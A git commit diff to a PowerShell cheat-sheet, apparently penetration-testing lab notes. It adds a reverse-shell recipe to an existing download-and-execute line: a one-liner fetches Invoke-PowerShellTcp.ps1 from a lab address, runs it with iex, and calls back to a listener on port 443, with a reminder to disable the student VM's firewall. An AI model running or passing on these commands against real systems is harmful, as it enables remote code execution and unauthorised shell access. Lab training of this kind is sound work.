62eaa2371852be3ef49e22b895e035a9986c2ed1
Rektsu <fonsobr@gmail.com>
2022-03-10 20:42:45 +0100

    Update PowerShell-Commands-and-Basics.ps1

--- PowerShell-Commands-and-Basics.ps1
+++ PowerShell-Commands-and-Basics.ps1
@@ -20,3 +20,8 @@ PSv3 onwards:
 
 iex (iwr 'http://webserver/payload.ps1')
 
+# REVERSE SHELL
+# REMEMBER TO TURN OFF THE FIREWALL IN THE STUDENT-VM or ADD AN EXCEPTION
+# Host machine needs a server to host Invoke-PowerShellTcp.ps1 such as HFS.
+# Remember to use netcat listening on port 443
+powershell iex (iwr -UseBasicParsing http://172.16.100.75/Invoke-PowerShellTcp.ps1);power -Reverse -IPAddress 172.17.100.75 -Port 443
